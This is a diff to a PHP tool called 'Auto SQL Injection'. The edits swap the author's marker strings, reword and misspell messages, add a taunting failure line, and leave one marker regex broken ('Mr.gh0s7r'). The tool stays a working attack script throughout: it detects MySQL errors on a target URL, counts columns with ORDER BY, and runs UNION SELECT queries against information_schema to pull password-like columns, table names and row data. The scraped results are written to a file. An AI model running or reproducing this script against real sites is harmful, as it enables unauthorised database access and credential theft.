@@ -31,19 +31,19 @@ Auto SQL Injection =D
         $get = file_get_contents("{$test}");
         if(eregi("MySQL",$get))
         {
-                echo "Infected .. Trying To Exploit\r\n";
+                echo "Mysql server found ... Trying To Attack\r\n";
                 $test2 = preg_replace("#{$id}\=([0-9]{1,6})#","{$id}=$1+/*!order+by*/+1000--",$target);
                 $order1 = file_get_contents($test2);
                 if(eregi("MySQL",$order1) or eregi("'1000' in 'order",$order1))
                 {
-                        echo "Please wite to get cals\r\n";
+                        echo "Please wrte to get cals\r\n";
                 }else{
-                        echo "Can't Get cols please test orther site\r\n";
+                        echo "Can't Get calls please test orther site\r\n";
                         exit();
                 }
                 for($i=1;$i<=50;$i++)
                 {
-                        echo (($i-1)==0)?"":"Col ".($i-1)."\r\n";
+                        echo (($i-1)==0)?"":"Call ".($i-1)."\r\n";
                         $un .= "{$i},";
                         $test1 = preg_replace("#{$id}\=([0-9]{1,6})#","{$id}=$1+/*!order+by*/+{$i}--",$target);
                         $order = file_get_contents($test1);
@@ -59,6 +59,10 @@ Auto SQL Injection =D
                                 break;
                         }
                 }
+                /*
+                Khalid aka Mr.Gh0s7 started coding. 
+                */
+                
                 $u = $by;
                 $un = preg_replace("#,{$u},#","",$un);
                 $target = preg_replace("#{$id}\=([0-9]{1,6})#","{$id}=-$1",$target);
@@ -66,7 +70,7 @@ Auto SQL Injection =D
                 $url = urlencode(" /*!union select*/ {$injc} /*!from information_schema.columns where column_name like char(37, 112, 97, 115, 115, 37)*/--");
                 $fulltarget = "{$target}{$url}";
                 $exploit = @file_get_contents($fulltarget);
-                preg_match("#Mr.Dm4r(.*?)Mr.Dm4r#",$exploit,$m);
+                preg_match("#Mr.gh0s7(.*?)Mr.gh0s7#",$exploit,$m);
                 $exp = explode("|:|",$m[1]);
                 $password = (($exp[0])=="")?"0x4e6f7420466f756e64":$exp[0];
                 $db = $exp[1];
@@ -77,7 +81,7 @@ Auto SQL Injection =D
                 $url2 = urlencode(" /*!union select*/ {$injc2} /*!from information_schema.columns where table_name=0x{$sqltable}*/--");
                 $fulltarget2 = "{$target}{$url2}";
                 $exploit2 = @file_get_contents($fulltarget2);
-                preg_match("#Mr.Dm4r(.*?)Mr.Dm4r#",$exploit2,$m2);
+                preg_match("#Mr.gh0s7(.*?)Mr.gh0s7#",$exploit2,$m2);
                 $m2[1] = explode(",",$m2[1]);
                 foreach($m2[1] as $tables)
                 {
@@ -93,7 +97,7 @@ Auto SQL Injection =D
                 $url3 = urlencode(" /*!union select*/ {$injc3} /*! from {$table}*/--");
                 $fulltarget3 = "{$target}{$url3}";
                 $exploit3 = @file_get_contents($fulltarget3);
-                preg_match("#Mr.Dm4r(.*?)Mr.Dm4r#",$exploit3,$m3);
+                preg_match("#Mr.gh0s7r(.*?)Mr.gh0s7#",$exploit3,$m3);
                 $infos = explode("|:|",$m3[1]);
                 $i=0;
                 foreach($infos as $info){
@@ -103,7 +107,7 @@ Auto SQL Injection =D
                 file_put_contents("dd.txt",$exploit2."\r\n".$fulltarget2);
                 #print_r($m2);
         } else {
-                echo "not infected";
+                echo "sorry but its not infected,so get bitten by a dog and die.";
         }
  
 ?>
